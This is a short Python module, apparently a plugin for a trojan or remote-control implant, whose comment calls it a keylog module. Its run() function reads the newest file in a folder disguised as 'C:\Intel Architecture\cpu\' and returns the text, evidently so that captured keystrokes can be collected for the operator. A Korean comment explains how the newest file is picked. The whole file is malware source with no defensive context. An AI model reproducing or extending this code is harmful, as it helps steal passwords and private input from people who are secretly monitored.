import os

def run(**args):
  #print "[*] In keylog module."
  files=os.listdir("C:\\Intel Architecture\\cpu\\")
  count=-1
  fileName="C:\\Intel Architecture\\cpu\\"
  str=""
  for file in files:
    count+=1
  fileName+=files[count] #시간은 증가하므로 폴더 내의 가장 마지막 파일이 가장 최근 파일이다.
  fp=open(fileName,"r")
  words=fp.readlines()
  for word in words:
    str+=word
  return str
